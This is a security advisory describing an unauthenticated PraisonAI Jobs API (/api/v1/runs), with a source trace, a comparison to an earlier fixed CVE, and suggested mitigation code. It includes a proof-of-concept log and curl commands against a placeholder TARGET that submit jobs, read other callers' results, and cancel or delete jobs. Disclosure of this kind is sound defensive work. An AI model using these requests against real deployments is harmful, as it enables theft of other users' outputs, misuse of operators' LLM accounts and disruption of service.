summary: "PraisonAI: [Auth Bypass] PraisonAI async Jobs API (`/api/v1/runs`) has no authentication\
  \ — unauthenticated job execution, result theft, cancel and delete\n### Summary\nPraisonAI's\
  \ async **Jobs API** (the FastAPI service in `praisonai/jobs/`) installs its router with no\
  \ authentication middleware, no router-level dependency, and no per-route auth check. Any\
  \ caller who can reach the jobs server can submit agent jobs (executed against the operator's\
  \ configured LLM credentials), list every job in the shared store, read other jobs' results,\
  \ cancel running jobs, and delete terminal jobs — with no token, cookie, session, or per-job\
  \ ownership value.\n \nThe server's default bind is `127.0.0.1`, so remote reach requires\
  \ an operator to bind a public interface, container-publish, reverse-proxy, or tunnel the\
  \ service. Once reachable, the primitive is fully pre-authenticated.\n \n**This is a distinct,\
  \ still-unpatched sibling of CVE-2026-44338.** That CVE (GHSA-6rmh-7xcm-cpxj, fixed in 4.6.34)\
  \ covered only the *legacy Flask* server `src/praisonai/api_server.py`. The fix added `AUTH_ENABLED`/`AUTH_TOKEN`/`check_auth()`\
  \ to that file and did **not** touch the FastAPI jobs module. At the latest commit (`9fcac3a`,\
  \ version **4.6.51**) the legacy Flask server is patched but the jobs API remains completely\
  \ unauthenticated.\n\n## Technical Detail\n \n### Source-to-sink trace\n \nThe FastAPI app\
  \ includes the jobs router with only CORS middleware — no auth (`server.py`, `create_app`):\n\
  \ \n```python\n# src/praisonai/praisonai/jobs/server.py\ndef create_app(store=None, executor=None,\
  \ cors_origins=None) -> FastAPI:\n    app = FastAPI(title=\"PraisonAI Jobs API\", ...)\n \
  \   # ... CORS middleware only (allow_headers includes \"Authorization\",\n    #     but CORS\
  \ is not authentication) ...\n    jobs_router = create_router(get_store(), get_executor())\n\
  \    app.include_router(jobs_router)        # no dependencies=[Depends(...)]\n```\n \nThe\
  \ router (built inside `create_router()`) registers every job operation with no auth dependency.\
  \ The only `Header(...)` parameter anywhere is the `Idempotency-Key`, which is deduplication,\
  \ not authorization:\n \n```python\n# src/praisonai/praisonai/jobs/router.py\nrouter = APIRouter(prefix=\"\
  /api/v1/runs\", tags=[\"jobs\"])\n \n@router.post(\"\",          status_code=202)  async def\
  \ submit_job(request, response, body, idempotency_key=Header(None, alias=\"Idempotency-Key\"\
  )): ...\n@router.get(\"\")                              async def list_jobs(status=None, session_id=None,\
  \ page=1, page_size=20): ...\n@router.get(\"/{job_id}\")                     async def get_job_status(job_id):\
  \ ...\n@router.get(\"/{job_id}/result\")              async def get_job_result(job_id): ...\n\
  @router.post(\"/{job_id}/cancel\")             async def cancel_job(job_id): ...\n@router.delete(\"\
  /{job_id}\", status_code=204) async def delete_job(job_id): ...\n@router.get(\"/{job_id}/stream\"\
  )              async def stream_job(job_id): ...\n```\n \n`submit_job()` builds a `Job` from\
  \ attacker-controlled JSON and submits it. The executor saves and schedules it, and for the\
  \ default `praisonai` framework runs the attacker prompt against a real agent:\n \n```python\n\
  # executor.py — submit() -> _execute_job() -> _run_agent() -> _run_praisonai_agents()\nagent\
  \ = Agent(instructions=\"You are a helpful AI assistant.\", output=\"minimal\")\nresult =\
  \ await asyncio.to_thread(agent.start, job.prompt)   # attacker-controlled prompt\n```\n \n\
  The in-memory store has **no owner / principal / user concept**. `list_jobs()` returns the\
  \ whole store filtered only by caller-supplied `status`/`session_id`:\n \n```python\n# store.py\n\
  async def list_jobs(self, status=None, session_id=None, limit=20, offset=0):\n    jobs = list(self._jobs.values())\
  \        # global; no owner binding\n    if session_id: jobs = [j for j in jobs if j.session_id\
  \ == session_id]\n    ...\n```\n \nA repository-wide grep of `jobs/` for `Depends|verify|token|authorization|bearer|x-api-key|HTTPBearer|AUTH_ENABLED|check_auth`\
  \ returns **only** the string `\"Authorization\"` inside the CORS `allow_headers` list. There\
  \ is no authentication primitive in the module.\n \n### Distinction from CVE-2026-44338 (critical\
  \ for triage)\n \n| | CVE-2026-44338 (already fixed) | This finding |\n|---|---|---|\n| Component\
  \ | Legacy Flask `src/praisonai/api_server.py` | FastAPI `praisonai/jobs/` |\n| Endpoints\
  \ | `GET /agents`, `POST /chat` | `/api/v1/runs` (submit/list/get/result/cancel/delete/stream)\
  \ |\n| Root cause | `AUTH_ENABLED=False`, `AUTH_TOKEN=None`, no-op `check_auth()` | No auth\
  \ dependency, middleware, or token exists at all |\n| Status at 4.6.51 | **Patched** (auth\
  \ enabled by default, token auto-generated, `secrets.compare_digest`) | **Unpatched** |\n\
  \ \nThe 4.6.34 remediation hardened only the Flask file. The jobs module is a separate code\
  \ path that the fix did not reach.\n \n### Trigger conditions\n \n1. Start the server, e.g.\
  \ `python -m uvicorn praisonai.jobs.server:create_app --port 8005 --factory`.\n2. Make it\
  \ reachable (`--host 0.0.0.0`, container publish, reverse proxy, tunnel).\n3. Send unauthenticated\
  \ requests to `POST/GET /api/v1/runs`, `GET /api/v1/runs/{id}`, `GET /api/v1/runs/{id}/result`,\
  \ `POST /api/v1/runs/{id}/cancel`, `DELETE /api/v1/runs/{id}`.\n\n## Proof of Concept\n \n\
  Verified dynamically by running the **real** `praisonai.jobs` router, executor, and store\
  \ over HTTP via FastAPI `TestClient`. The only stub is `praisonaiagents.Agent` (its `.start()`\
  \ returns canned text), so **no real LLM call and no API credentials were used**. Every request\
  \ below was sent with **no `Authorization` header, cookie, or token** (the runner asserts\
  \ `Authorization sent: None` on each).\n \n```\n## Unauth POST /api/v1/runs (submit job)\n\
  \   POST /api/v1/runs            -> HTTP 202   Authorization sent: None\n   body: {\"job_id\"\
  :\"run_de282b4c3f1c\",\"status\":\"queued\", ...}\n \n## Unauth GET /api/v1/runs (list every\
  \ job in shared store)\n   GET /api/v1/runs             -> HTTP 200   Authorization sent:\
  \ None\n   body: {\"jobs\":[{\"job_id\":\"run_de282b4c3f1c\",\"status\":\"succeeded\", ...}],\
  \ \"total\":1, ...}\n \n## Unauth GET /api/v1/runs/{id}/result (read tenant output)\n   GET\
  \ /api/v1/runs/.../result  -> HTTP 200   Authorization sent: None\n   body: {\"result\":\"\
  TENANT-PRIVATE-OUTPUT for prompt='attacker-controlled job'\", ...}\n \n## Unauth POST /api/v1/runs/{id}/cancel\
  \ (cancel a RUNNING job)\n   t=0.0s status=running ... t=2.0s status=running\n   POST /api/v1/runs/.../cancel\
  \ -> HTTP 200   Authorization sent: None\n   after cancel status=cancelled\n \n## Unauth DELETE\
  \ /api/v1/runs/{id} (delete terminal job)\n   DELETE /api/v1/runs/...       -> HTTP 204  \
  \ Authorization sent: None\n```\n \nEach privileged operation succeeded with zero credentials.\
  \ (The result endpoint returns a different job's stored output — the cross-job confidentiality\
  \ primitive.)\n \n### Equivalent trigger in a fully installed, network-exposed deployment\n\
  \ \n```bash\npython -m uvicorn praisonai.jobs.server:create_app --host 0.0.0.0 --port 8005\
  \ --factory\n \ncurl -sS -X POST http://TARGET:8005/api/v1/runs \\\n  -H 'Content-Type: application/json'\
  \ \\\n  --data-binary '{\"prompt\":\"attacker controlled job\",\"timeout\":3600}'\ncurl -sS\
  \ http://TARGET:8005/api/v1/runs\ncurl -sS http://TARGET:8005/api/v1/runs/<job_id>/result\n\
  curl -sS -X POST http://TARGET:8005/api/v1/runs/<job_id>/cancel\ncurl -sS -X DELETE http://TARGET:8005/api/v1/runs/<job_id>\n\
  ```\n \n## Impact\n \n- **Execution / cost**: unauthenticated callers run arbitrary prompts\
  \ against the operator's configured LLM credentials, and can queue long-running jobs (up to\
  \ `timeout`, default 3600s) consuming CPU, memory, queue slots, and provider billing.\n- **Confidentiality**:\
  \ callers list all jobs (`GET /api/v1/runs`) and read completed results from the shared store\
  \ — other callers' agent outputs.\n- **Integrity / control**: callers cancel running jobs\
  \ and delete terminal jobs.\nThe realistic worst case is a reachable jobs endpoint used to\
  \ run unauthorized prompts on the operator's LLM account, then enumerate and exfiltrate other\
  \ jobs' outputs.\n \n## Suggested Mitigation\n \nMirror the fix already applied to the legacy\
  \ Flask server (CVE-2026-44338), but for the jobs router:\n \n- Add a jobs-server auth token\
  \ (e.g. `PRAISONAI_JOBS_API_TOKEN`) and require it on every `/api/v1/runs` route via a **router-level\
  \ dependency**, so future routes inherit protection by default.\n- Use constant-time comparison\
  \ (`hmac.compare_digest` / `secrets.compare_digest`).\n- Add per-job ownership / scoped job\
  \ tokens so one caller cannot list, read, cancel, or delete another caller's jobs.\n- Keep\
  \ `127.0.0.1` as default; warn or refuse when binding a public interface without auth configured.\n\
  - Regression tests asserting unauthenticated `POST` / `GET` / `cancel` / `delete` return `401`\
  \ when auth is enabled.\n```python\nimport hmac, os\nfrom fastapi import Depends, Header,\
  \ HTTPException\n \ndef verify_jobs_token(authorization: str | None = Header(None),\n    \
  \                  x_api_key: str | None = Header(None, alias=\"X-API-Key\")):\n    expected\
  \ = os.getenv(\"PRAISONAI_JOBS_API_TOKEN\")\n    if not expected:\n        raise HTTPException(401,\
  \ \"Jobs API auth is not configured\")\n    token = x_api_key\n    if authorization and authorization.startswith(\"\
  Bearer \"):\n        token = authorization[7:]\n    if not token or not hmac.compare_digest(token,\
  \ expected):\n        raise HTTPException(401, \"Unauthorized\")\n \n# create_router(...)\
  \ -> APIRouter(prefix=\"/api/v1/runs\", dependencies=[Depends(verify_jobs_token)])\n```"
